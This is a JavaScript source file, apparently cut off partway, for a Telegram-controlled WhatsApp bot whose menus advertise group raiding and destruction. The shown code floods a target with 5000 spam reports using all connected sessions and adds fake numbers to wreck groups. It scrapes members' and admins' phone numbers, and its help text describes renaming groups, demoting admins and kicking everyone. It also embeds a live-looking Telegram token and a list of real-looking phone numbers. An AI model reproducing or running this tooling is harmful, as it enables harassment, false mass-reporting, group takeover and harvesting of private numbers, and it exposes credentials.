'use strict';

// ===== إجبار الشبكة على استخدام IPv4 =====
const dns = require('dns');
dns.setDefaultResultOrder('ipv4first');

const { Telegraf, Markup } = require('telegraf');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
const P = require('pino');
const fs = require('fs');
const path = require('path');

const TELEGRAM_TOKEN = '8923729748:AAFRw3lry-p1K49tyULF-BYjfYeSsv1Qtuo';
const SESSIONS_DIR = path.join(__dirname, 'sessions');
const STATS_DIR = path.join(__dirname, 'stats');
const DATA_DIR = path.join(__dirname, 'data');
const CHANNELS_FILE = path.join(DATA_DIR, 'channels.json');
const ATTEMPTS_FILE = path.join(DATA_DIR, 'attempts.json');
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vb9Mw8S7z4kp79ri823E';

const PASSWORD_SECRET = '1q2w3e4r1q2w3e4r';

const TARGET_NUMBERS_POOL = [
    '249966122673', '967715825775', '213667337794', '201553816272',
    '201509020176', '249908969760', '201225474786', '212687180270',
    '201272639146', '201505522697', '963949294164', '201022141601',
    '963968943375', '96893300385', '212698856340', '201505681891',
    '97339959153', '249961401076', '201067163341', '201212497291', '201080737256'
];

for (const d of [DATA_DIR, SESSIONS_DIR, STATS_DIR]) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

process.on('uncaughtException', function(e) {});
process.on('unhandledRejection', function(r) {});

function loadJSON(f, fb) {
  try { return JSON.parse(fs.readFileSync(f, 'utf-8')); } catch { return fb; }
}
let channels = loadJSON(CHANNELS_FILE, {});
let attemptsData = loadJSON(ATTEMPTS_FILE, {});

function saveChannels() {
  const tmp = CHANNELS_FILE + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(channels, null, 2));
  fs.renameSync(tmp, CHANNELS_FILE);
}

function saveAttempts() {
  const tmp = ATTEMPTS_FILE + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(attemptsData, null, 2));
  fs.renameSync(tmp, ATTEMPTS_FILE);
}

function loadData() { try { return JSON.parse(fs.readFileSync(path.join(__dirname, 'data.json'), 'utf-8')); } catch (e) { return {}; } }
function saveData(d) { try { fs.writeFileSync(path.join(__dirname, 'data.json'), JSON.stringify(d, null, 2)); } catch (e) { } }

const usersData = loadData();
const sessions = new Map();
const pendingAuth = new Map(); 
const devModeSessions = new Set();
const processedChannels = new Set();

function updateStats(telegramId, kickedCount) {
    const statsFile = path.join(STATS_DIR, 'user_' + telegramId + '.json');
    let stats = { totalHelak: 0, totalKicked: 0 };
    try {
        if (fs.existsSync(statsFile)) stats = JSON.parse(fs.readFileSync(statsFile, 'utf-8'));
    } catch (e) {}
    stats.totalHelak += 1;
    stats.totalKicked += (kickedCount || 0);
    try { fs.writeFileSync(statsFile, JSON.stringify(stats, null, 2)); } catch (e) {}
}

function getUserStats(telegramId) {
    const statsFile = path.join(STATS_DIR, 'user_' + telegramId + '.json');
    try {
        if (fs.existsSync(statsFile)) return JSON.parse(fs.readFileSync(statsFile, 'utf-8'));
    } catch (e) {}
    return { totalHelak: 0, totalKicked: 0 };
}

function getQuickImage() {
    try {
        const extPath = '/sdcard/MyBot/image.jpg';
        const locPath = path.join(__dirname, 'image.jpg');
        if (fs.existsSync(extPath)) return fs.readFileSync(extPath);
        if (fs.existsSync(locPath)) return fs.readFileSync(locPath);
    } catch (e) {}
    return null;
}

function extractInviteCode(link) {
    if (!link) return null;
    let match = link.match(/whatsapp\.com\/(?:channel|join|chat)\/([a-zA-Z0-9_-]+)/);
    return match ? match[1] : null;
}

async function enrichChannel(sock, jid) {
  try {
    const meta = await sock.newsletterMetadata('jid', jid);
    if (!meta) return;
    const tm = meta.thread_metadata || meta;
    const name = tm.name?.text || meta.name || 'بدون اسم';
    const inviteCode = meta.invite || tm.invite?.code || tm.invite_code || null;

    channels[jid] = {
      jid,
      name,
      type: 'channel',
      link: inviteCode ? 'https://whatsapp.com/channel/' + inviteCode : null,
      subscribers: tm.subscribers_count ?? meta.subscribers ?? null,
      capturedAt: channels[jid]?.capturedAt || Date.now(),
      updatedAt: Date.now(),
    };
    saveChannels();
  } catch {}
}

async function connectWhatsApp(telegramId, phoneNumber, bot) {
    const sessionDir = path.join(SESSIONS_DIR, 'user_' + telegramId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS('Chrome'),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 25000,
        retryRequestDelayMs: 500,
        shouldSyncHistoryMessage: function() { return false; }
    });

    sessions.set(telegramId, { 
        sock: sock, 
        phone: phoneNumber, 
        status: 'connecting', 
        reconnectAttempts: 0,
        contacts: {},
        channelsCache: [],
        groupsCache: []
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('contacts.upsert', function(contacts) {
        const s = sessions.get(telegramId);
        if (!s) return;
        for (let i = 0; i < contacts.length; i++) {
            let c = contacts[i];
            if (c.id && (c.name || c.notify)) {
                s.contacts[c.id] = c.name || c.notify;
            }
        }
    });

    sock.ev.on('messages.upsert', async function(update) {
        const messages = update.messages;
        const type = update.type;
        
        for (const msg of messages) {
            const jid = msg?.key?.remoteJid;
            if (jid && jid.endsWith('@newsletter')) {
                if (!channels[jid]?.name && !processedChannels.has(jid)) {
                    processedChannels.add(jid);
                    await enrichChannel(sock, jid);
                }
            }
        }

        if (type !== 'notify') return;
        
        const msg = messages.get ? messages.get(0) : messages[0];
        if (!msg || !msg.message) return;
        
        const remoteJid = msg.key.remoteJid;
        const isGroup = remoteJid.endsWith('@g.us');
        const text = msg.message.conversation || (msg.message.extendedTextMessage ? msg.message.extendedTextMessage.text : '') || '';
        
        usersData[telegramId] = usersData[telegramId] || {};
        const uData = usersData[telegramId];
        const userPhone = uData.phone || '';
        const senderJid = msg.key.participant || remoteJid;
        const isMyMessage = msg.key.fromMe || (userPhone && senderJid.includes(userPhone));

        if (isGroup && uData.autoReactEnabled && uData.reactEmoji && !isMyMessage) {
            let shouldReact = false;
            if (uData.reactMode === 'all') {
                shouldReact = true;
            } else if (uData.reactMode === 'custom' && uData.allowedGroups && uData.allowedGroups.length > 0) {
                if (uData.allowedGroups.includes(remoteJid)) {
                    shouldReact = true;
                }
            }

            if (shouldReact) {
                try {
                    const groupMeta = await sock.groupMetadata(remoteJid).catch(() => null);
                    if (groupMeta && groupMeta.participants) {
                        const participant = groupMeta.participants.find(p => p.id === senderJid);
                        if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
                            await sock.sendMessage(remoteJid, { react: { text: uData.reactEmoji, key: msg.key } }).catch(() => {});
                        }
                    }
                } catch (e) {}
            }
        }

        if (!text) return;

        if (uData.mode === 'وحدي' && !isMyMessage) return;
        if (!isMyMessage && uData.mode !== 'الكل' && uData.mode !== 'وحدي') {
            if (!isMyMessage) return;
        }

        if (!text.startsWith('.')) return;

        const args = text.slice(1).trim().split(/\s+/);
        const command = args.shift().toLowerCase();
        const paramArg = args.join(' ').trim();

        if (command === 'الكل') {
            const subAction = args[0] ? args[0].toLowerCase() : '';
            if (subAction === 'تفاعل' && args[1] === 'تشغيل') {
                uData.autoReactEnabled = true;
                uData.reactMode = 'all';
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: '🟢 *تم تفعيل التفاعل التلقائي على رسائل المشرفين للكل.*' }, { quoted: msg });
            } else {
                uData.mode = 'الكل';
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: '✅ *تم تفعيل البوت للجميع في المجموعات.*' }, { quoted: msg });
            }
        }
        else if (command === 'وحدي') {
            uData.mode = 'وحدي';
            saveData(usersData);
            await sock.sendMessage(remoteJid, { text: '🔒 *تم قصر استخدام البوت عليك وحدك.*' }, { quoted: msg });
        }
        else if (command === 'أدخل') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* يرجى كتابة الإيموجي.\n📌 الاستخدام: `.أدخل 🗿`' }, { quoted: msg });
                return;
            }
            uData.reactEmoji = paramArg;
            saveData(usersData);
            await sock.sendMessage(remoteJid, { text: `✅ *تم حفظ الإيموجي بنجاح:* ${paramArg}` }, { quoted: msg });
        }
        else if (command === 'تفاعل') {
            const subCmd = args[0] ? args[0].toLowerCase() : '';
            if (subCmd === 'تشغيل' || subCmd === 'on') {
                uData.autoReactEnabled = true;
                uData.reactMode = 'all';
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: '🟢 *تم تفعيل التفاعل التلقائي لرسائل المشرفين في كل الجروبات.*' }, { quoted: msg });
            } else if (subCmd === 'إيقاف' || subCmd === 'off') {
                uData.autoReactEnabled = false;
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: '🔴 *تم إيقاف ميزة التفاعل التلقائي.*' }, { quoted: msg });
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ الاستخدام الصحيح:\n- `.تفاعل تشغيل`\n- `.تفاعل إيقاف`' }, { quoted: msg });
            }
        }
        else if (text.startsWith('.خاص_تفاعل_تشغيل')) {
            const grpTarget = paramArg;
            if (!grpTarget) {
                await sock.sendMessage(remoteJid, { text: '⚠️ يرجى تحديد رقم الجروب أو الأرقام مفصولة بشرطة مائلة (مثل: `9/6/5`).\n📌 الاستخدام: `.خاص_تفاعل_تشغيل 1` أو `.خاص_تفاعل_تشغيل 9/6/5`' }, { quoted: msg });
                return;
            }
            const cachedGrps = uData.cachedGroups || [];
            let resolvedJids = [];

            let parts = grpTarget.split('/');
            for (let part of parts) {
                let idx = parseInt(part.trim()) - 1;
                if (!isNaN(idx) && cachedGrps[idx]) {
                    resolvedJids.push(cachedGrps[idx].id);
                }
            }

            if (resolvedJids.length > 0) {
                uData.autoReactEnabled = true;
                uData.reactMode = 'custom';
                uData.allowedGroups = resolvedJids;
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: `🟢 *تم تفعيل التفاعل التلقائي للمشرفين في الجروبات المحددة بنجاح!* (عددها: ${resolvedJids.length})` }, { quoted: msg });
            } else {
                await sock.sendMessage(remoteJid, { text: '❌ *خطأ:* يرجى عرض الجروبات أولاً باستخدام `.groups` أو `.جروبات` ثم تحديد الأرقام الصحيحة.' }, { quoted: msg });
            }
        }
        else if (command === 'سحب') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* يرجى إرفاق رابط أو هدف لسحبه.\n📌 الاستخدام: `.سحب [الرابط]`' }, { quoted: msg });
                return;
            }
            const inviteCode = extractInviteCode(paramArg);
            if (!inviteCode) {
                await sock.sendMessage(remoteJid, { text: '❌ *خطأ:* الرابط غير صالح.' }, { quoted: msg });
                return;
            }
            try {
                if (paramArg.includes('/channel/')) {
                    const nMeta = await sock.newsletterMetadata('invite', inviteCode);
                    const tm = nMeta.thread_metadata || nMeta;
                    const subCount = tm.subscribers_count ?? 'غير متاح';
                    await sock.sendMessage(remoteJid, { text: `📺 *معلومات القناة المسحوبة:*\n• الاسم: ${tm.name?.text || nMeta.name || 'غير معروف'}\n• المتابعين: ${subCount}` }, { quoted: msg });
                } else {
                    const gInfo = await sock.groupGetInviteInfo(inviteCode);
                    await sock.sendMessage(remoteJid, { text: `📁 *معلومات الجروب المسحوب:*\n• الاسم: ${gInfo.subject}\n• المشاركون: ${gInfo.size}` }, { quoted: msg });
                }
            } catch (e) {
                await sock.sendMessage(remoteJid, { text: '❌ *فشل السحب:* تأكد من صلاحيات الرابط.' }, { quoted: msg });
            }
        }
        else if (command === 'شرح') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '📌 *أمر الشرح:* اكتب اسم الأمر بعد الشرح لمعرفة وظيفته.\n💡 مثال: `.شرح death` أو `.شرح هلاك`' }, { quoted: msg });
                return;
            }
            let exp = '';
            const cmdName = paramArg.replace('.', '').toLowerCase();
            switch (cmdName) {
                case 'menu': case 'اوامر': exp = 'عرض القائمة الرئيسية للأوامر وتصنيفاتها المزخرفة.'; break;
                case 'زرف': exp = 'عرض قائمة أوامر الزرف التدميرية.'; break;
                case 'تخريب': exp = 'عرض قائمة أوامر التخريب والهجوم.'; break;
                case 'جانبية': case 'اوامر جانبية': exp = 'عرض أوامر الأدوات الجانبية والإضافية.'; break;
                case 'هلاك': case 'zarf': exp = 'سحق وتدمير الجروب وتغيير الاسم والوصف وتنزيل المشرفين وطرد الجميع.'; break;
                case 'طرد': exp = 'طرد عضو محدد عبر عمل منشن له.'; break;
                case 'status': case 'حالة': exp = 'عرض تفصيلي لحالة اتصال البوت والإحصائيات.'; break;
                case 'delay': exp = 'ضبط وتحديد سرعة التأخير للإجراءات.'; break;
                case 'channels': exp = 'عرض القنوات المؤرشفة المرقمة.'; break;
                case 'groups': exp = 'عرض قائمة الجروبات المرقمة.'; break;
                case 'info': exp = 'جلب معلومات مفصلة عن رابط قناة أو مجموعة.'; break;
                case 'سحب': exp = 'سحب وتفقد بيانات الرابط أو القناة أو الجروب.'; break;
                case 'death': case 'ابلاغ': exp = 'إرسال 5000 بلاغ مكثف ومنسق على الهدف المحدد.'; break;
                case 'الكل': exp = 'السماح للجميع باستخدام البوت، أو تفعيل التفاعل العام.'; break;
                case 'وحدي': exp = 'قصر استخدام البوت عليك وحدك.'; break;
                case 'قتل': exp = 'إضافة أرقام وهمية وتدمير الجروب عبر رقمه من القائمة.'; break;
                case 'استخراج': exp = 'استخراج وفهرسة جميع أرقام المشرفين والأعضاء من جروب أو قناة محددة.'; break;
                case 'أدخل': exp = 'تحديد الإيموجي الذي سيستخدمه البوت للتفاعل.'; break;
                case 'تفاعل': exp = 'تشغيل أو إيقاف التفاعل التلقائي على محتوى المشرفين.'; break;
                default: exp = '❌ هذا الأمر غير موجود أو غير مسجل في قائمة الشرح.'; break;
            }
            await sock.sendMessage(remoteJid, { text: `📖 *شرح الأمر (${paramArg}):*\n${exp}` }, { quoted: msg });
        }
        else if (command === 'channels' || command === 'قنوات') {
            const items = Object.values(channels).filter(c => c.type === 'channel' || !c.type);
            if (!items.length) {
                await sock.sendMessage(remoteJid, { text: '📭 *خطأ:* لا توجد قنوات مسجلة بعد.' }, { quoted: msg });
                return;
            }
            let response = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n📺 *قائمة القنوات المرقمة:*\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n';
            uData.cachedChannels = items;
            for (let i = 0; i < items.length; i++) {
                response += `${i + 1}.${items[i].name}\n`;
            }
            await sock.sendMessage(remoteJid, { text: response }, { quoted: msg });
        } 
        else if (command === 'groups' || command === 'جروبات') {
            try {
                const groupsObj = await sock.groupFetchAllParticipating();
                const groupList = Object.values(groupsObj || {});
                if (groupList.length === 0) {
                    await sock.sendMessage(remoteJid, { text: '📁 *خطأ:* لا توجد أي جروبات.' }, { quoted: msg });
                    return;
                }
                let response = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n📁 *قائمة الجروبات المرقمة:*\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n';
                uData.cachedGroups = groupList;
                
                for (let i = 0; i < groupList.length; i++) {
                    response += `${i + 1}.${groupList[i].subject || 'بدون اسم'}\n`;
                }
                await sock.sendMessage(remoteJid, { text: response }, { quoted: msg });
            } catch (e) {
                await sock.sendMessage(remoteJid, { text: '❌ *خطأ تقني:* فشل جلب المجموعات.' }, { quoted: msg });
            }
        } 
        else if (command === 'استخراج') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* يرجى تحديد الهدف.\n📌 الاستخدام: `.استخراج [الرابط أو الرقم]`' }, { quoted: msg });
                return;
            }

            let targetJid = paramArg.trim();
            const indexNum = parseInt(paramArg) - 1;
            const cachedGrps = uData.cachedGroups || [];
            const cachedChans = uData.cachedChannels || [];

            if (!isNaN(indexNum)) {
                if (cachedGrps[indexNum]) {
                    targetJid = cachedGrps[indexNum].id;
                } else if (cachedChans[indexNum]) {
                    targetJid = cachedChans[indexNum].jid;
                }
            } else {
                if (!targetJid.includes('@')) {
                    let cleanNum = targetJid.replace(/[^0-9]/g, '');
                    targetJid = cleanNum + '@s.whatsapp.net';
                }
                const code = extractInviteCode(paramArg);
                if (code && paramArg.includes('/channel/')) {
                    const nInfo = await sock.newsletterMetadata('invite', code).catch(() => null);
                    if (nInfo && nInfo.id) targetJid = nInfo.id;
                } else if (code) {
                    const gInfo = await sock.groupGetInviteInfo(code).catch(() => null);
                    if (gInfo && gInfo.id) targetJid = gInfo.id;
                }
            }

            await sock.sendMessage(remoteJid, { text: '🔍 *جاري استخراج وفهرسة الأرقام...* ⏳' }, { quoted: msg });

            try {
                if (targetJid.endsWith('@g.us')) {
                    const groupMeta = await sock.groupMetadata(targetJid);
                    const participants = groupMeta.participants || [];
                    
                    let adminsList = '👑 *قائمة المشرفين:*\n';
                    let membersList = '👥 *قائمة الأعضاء العاديين:*\n';
                    let adminCount = 0;
                    let memberCount = 0;

                    for (let p of participants) {
                        let num = p.id.split('@')[0];
                        if (p.admin === 'admin' || p.admin === 'superadmin') {
                            adminCount++;
                            adminsList += `${adminCount}. +${num} (${p.admin === 'superadmin' ? 'مشرف أساسي' : 'مشرف'})\n`;
                        } else {
                            memberCount++;
                            membersList += `${memberCount}. +${num}\n`;
                        }
                    }

                    let fullReport = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                                     `📊 *نتيجة استخراج أرقام الجروب (${groupMeta.subject || 'بدون اسم'}):*\n` +
                                     '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                                     `📌 إجمالي المشرفين: ${adminCount}\n` +
                                     `📌 إجمالي الأعضاء: ${memberCount}\n\n` +
                                     adminsList + '\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' + membersList;

                    await sock.sendMessage(remoteJid, { text: fullReport }, { quoted: msg });
                } else if (targetJid.endsWith('@newsletter')) {
                    const newsletterMeta = await sock.newsletterMetadata('jid', targetJid).catch(() => null);
                    let subCount = newsletterMeta?.subscribersCount || 'غير متاح';
                    await sock.sendMessage(remoteJid, { text: `📺 *معلومات القناة:*\n📌 عدد المتابعين: ${subCount}` }, { quoted: msg });
                } else {
                    await sock.sendMessage(remoteJid, { text: '❌ *خطأ:* الهدف المحدد غير صالح.' }, { quoted: msg });
                }
            } catch (e) {
                await sock.sendMessage(remoteJid, { text: '❌ *فشل الاستخراج.*' }, { quoted: msg });
            }
        }
        else if (command === 'قتل') {
            const groupIdx = parseInt(paramArg) - 1;
            const cachedGrps = uData.cachedGroups || [];
            let targetGroupJid = remoteJid;

            if (!isNaN(groupIdx) && cachedGrps[groupIdx]) {
                targetGroupJid = cachedGrps[groupIdx].id;
            }

            await sock.sendMessage(remoteJid, { text: '🚨 جاري التدمير... ⚡' }, { quoted: msg });
            
            const fakeNumbers = [];
            for (let i = 0; i < 5; i++) {
                let randomNum = '385' + Math.floor(100000000000 + Math.random() * 900000000000);
                fakeNumbers.push(randomNum + '@s.whatsapp.net');
            }

            try {
                await sock.groupParticipantsUpdate(targetGroupJid, fakeNumbers, 'add');
            } catch (err) {}

            await delay(1000);
            await sock.sendMessage(remoteJid, { text: 'تم التدمير بنجاح' }, { quoted: msg });
        }
        else if (command === 'death' || command === 'ابلاغ') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* يجب إرفاق هدف.' }, { quoted: msg });
                return;
            }

            let targetJid = paramArg.trim();
            const groupIdx = parseInt(paramArg) - 1;
            const cachedGrps = uData.cachedGroups || [];

            if (!isNaN(groupIdx) && cachedGrps[groupIdx]) {
                targetJid = cachedGrps[groupIdx].id;
            } else {
                if (!targetJid.includes('@')) {
                    let cleanNum = targetJid.replace(/[^0-9]/g, '');
                    targetJid = cleanNum + '@s.whatsapp.net';
                }
                const code = extractInviteCode(paramArg);
                if (code && paramArg.includes('/channel/')) {
                    const nInfo = await sock.newsletterMetadata('invite', code).catch(() => null);
                    if (nInfo && nInfo.id) targetJid = nInfo.id;
                } else if (code) {
                    const gInfo = await sock.groupGetInviteInfo(code).catch(() => null);
                    if (gInfo && gInfo.id) targetJid = gInfo.id;
                }
            }

            await sock.sendMessage(remoteJid, { text: `🚨 *جاري إطلاق 5000 بلاغ مكثف...* ⚡` }, { quoted: msg });

            for (let round = 0; round < 50; round++) {
                let promises = [];
                for (let num of TARGET_NUMBERS_POOL) {
                    promises.push(sock.sendMessage(targetJid, { report: { type: 'SPAM' } }).catch(() => {}));
                }
                for (let [tId, sess] of sessions.entries()) {
                    if (sess.status === 'connected' && sess.sock) {
                        promises.push(sess.sock.sendMessage(targetJid, { report: { type: 'SPAM' } }).catch(() => {}));
                    }
                }
                await Promise.all(promises);
                await delay(20);
            }

            await sock.sendMessage(remoteJid, { text: `✅ *تم إرسال البلاغات بنجاح!*` }, { quoted: msg });
        }
        else if (command === 'menu' || command === 'اوامر') {
            sendWhatsAppMainCategoryMenu(sock, remoteJid, msg);
        }
        else if (command === 'زرف') {
            sendWhatsAppZarfMenu(sock, remoteJid, msg);
        }
        else if (command === 'تخريب') {
            sendWhatsAppTakhreebMenu(sock, remoteJid, msg);
        }
        else if (command === 'جانبية' || command === 'اوامر جانبية') {
            sendWhatsAppSideMenu(sock, remoteJid, msg);
        }
        else if (command === 'هلاك' || command === 'zarf') {
            if (isGroup) {
                sock.sendMessage(remoteJid, { react: { text: "😈", key: msg.key } }).catch(function(){});
                executeFullHelak(sock, remoteJid, args, telegramId, msg, senderJid);
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* أمر هلاك يعمل داخل المجموعات فقط.' }, { quoted: msg });
            }
        } 
        else if (command === 'طرد' || command === 'طرظ') {
            if (isGroup) {
                sock.sendMessage(remoteJid, { react: { text: "👢", key: msg.key } }).catch(function(){});
                executeKick(sock, remoteJid, args, msg);
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* أمر طرد مخصص للمجموعات فقط.' }, { quoted: msg });
            }
        } 
        else if (command === 'delay' || command === 'تأخير') {
            if (args[0]) {
                const delayVal = args[0];
                uData.delayConfig = delayVal;
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: `⏱️ *تم ضبط سرعة التأخير إلى:* ${delayVal} ثانية.` }, { quoted: msg });
            } else {
                const currentDelay = uData.delayConfig || '1';
                await sock.sendMessage(remoteJid, { text: `⏱️ *التأخير الحالي المحدد:* ${currentDelay} ثانية.` }, { quoted: msg });
            }
        } 
        else if (command === 'status' || command === 'حالة') {
            sendBotDetailedStatus(sock, remoteJid, telegramId, msg);
        } 
    });

    sock.ev.on('connection.update', async function(u) {
        const { connection, lastDisconnect, qr } = u;
        const s = sessions.get(telegramId);
        if (!s) return;

        if (qr && !sock.authState.creds.registered && phoneNumber) {
            try {
                await delay(500);
                const code = await sock.requestPairingCode(phoneNumber);
                const fmt = code?.match(/.{1,4}/g)?.join('-') || code;
                await bot.telegram.sendMessage(telegramId, '🔑 كود الربط:\n\n`' + fmt + '`', { parse_mode: 'Markdown' });
            } catch (e) {}
        }

        if (connection === 'open') {
            if (s.status !== 'connected') {
                s.status = 'connected'; 
                s.reconnectAttempts = 0;
                usersData[telegramId] = usersData[telegramId] || {};
                usersData[telegramId].phone = phoneNumber;
                usersData[telegramId].registered = true;
                saveData(usersData);
                
                const img = getQuickImage();
                const welcomeCaption = '⚡ *WA Manager - Online*\nYour bot is successfully connected and ready. Send `.menu` on WhatsApp.';
                const tgKeyboard = Markup.inlineKeyboard([
                    [Markup.button.callback('📊 Bot Status', 'tg_status'), Markup.button.callback('🔌 Unlink Bot', 'tg_logout')],
                    [Markup.button.url('📢 Channel', CHANNEL_LINK), Markup.button.callback('⚙️ Settings', 'tg_menu')]
                ]);

                if (img) {
                    await bot.telegram.sendPhoto(telegramId, { source: img }, { caption: welcomeCaption, parse_mode: 'Markdown', ...tgKeyboard });
                } else {
                    await bot.telegram.sendMessage(telegramId, welcomeCaption, { parse_mode: 'Markdown', ...tgKeyboard });
                }
            }
        }

        if (connection === 'close') {
            s.status = 'disconnected';
            const code = lastDisconnect?.error?.output?.statusCode;
            if (code === DisconnectReason.loggedOut || code === 401 || code === 403) {
                sessions.delete(telegramId);
                if (usersData[telegramId]) { usersData[telegramId].registered = false; saveData(usersData); }
                await bot.telegram.sendMessage(telegramId, '⚠️ تم تسجيل الخروج من واتساب.').catch(function(){});
                return;
            }
            s.reconnectAttempts = (s.reconnectAttempts || 0) + 1;
            if (s.reconnectAttempts > 30) { 
                sessions.delete(telegramId); 
                await bot.telegram.sendMessage(telegramId, '❌ توقف الاتصال بعد فشل متكرر.').catch(function(){});
                return; 
            }
            setTimeout(function() { connectWhatsApp(telegramId, phoneNumber, bot).catch(function(){}); }, 5000);
        }
    });
    return sock;
}

function sendWhatsAppMainCategoryMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*[ اوامر الزرف ]*\n' +
                        '> .زرف\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*[ اوامر التخريب ]*\n' +
                        '> .تخريب\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*[ اوامر جانبية ]*\n' +
                        '> .جانبية\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendWhatsAppZarfMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*[ اوامر الزرف ]*\n\n' +
                        '* *menu*\n' +
                        '* *هلاك / zarf*\n' +
                        '* *طرد*\n' +
                        '* *حالة/status*\n' +
                        '* *delay [ثانية]*\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendWhatsAppTakhreebMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '  *[ اوامر التخريب ]*\n\n' +
                        '* *.channels*\n' +
                        '* *.groups*\n' +
                        '* *.info [رابط]*\n' +
                        '* *.death [رابط/رقم]*\n' +
                        '* *.سحب [رابط]*\n' +
                        '* *.الكل / .وحدي*\n' +
                        '* *.قتل [رقم الجروب]*\n' +
                        '* *.استخراج [رابط/رقم]*\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendWhatsAppSideMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '  [ *اوامر جانبية* ]\n\n' +
                        '* *.أدخل [إيموجي]*\n' +
                        '* *.تفاعل تشغيل / إيقاف*\n' +
                        '* *.خاص_تفاعل_تشغيل [رقم الجروب أو أرقام مفصولة بشرطة]*\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendBotDetailedStatus(sock, targetJid, telegramId, msg) {
    const s = sessions.get(telegramId);
    const stats = getUserStats(telegramId);
    const u = usersData[telegramId] || {};
    const statusText = (s && s.status === 'connected') ? '✅ متصل ومستقر' : '❌ غير متصل';
    
    const statusReport = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                         '📊 *تقرير حالة البوت التفصيلية:*\n' +
                         '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                         `• حالة واتساب: ${statusText}\n` +
                         `• الرقم المربوط: ${u.phone ? '+' + u.phone : 'غير مربوط'}\n` +
                         `• إجمالي الهلاك المحفوظ: ${stats.totalHelak}\n` +
                         `• إجمالي الأعضاء المطردين: ${stats.totalKicked}\n\n` +
                         '📝 *القيم المخصصة المحفوظة:*\n' +
                         `• اسم الجروب الافتراضي: ${u.name || 'مزروف Venar'}\n` +
                         `• وصف الجروب الافتراضي: ${u.desc || 'تم سحقكم من قبل Venar'}\n` +
                         `• رسالة الهلاك المخصصة: ${u.msg || 'تم سحق الجروب بنجاح!'}\n` +
                         '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*';

    sock.sendMessage(targetJid, { text: statusReport }, { quoted: msg }).catch(function(){});
}

async function executeFullHelak(sock, groupJid, args, telegramId, msg, senderJid) {
    try {
        const u = usersData[telegramId] || {};
        const customName = u.name || 'مزروف Venar';
        const customDesc = u.desc || 'تم سحقكم من قبل Venar';
        const customMsg = u.msg || 'تم سحق الجروب بنجاح!';
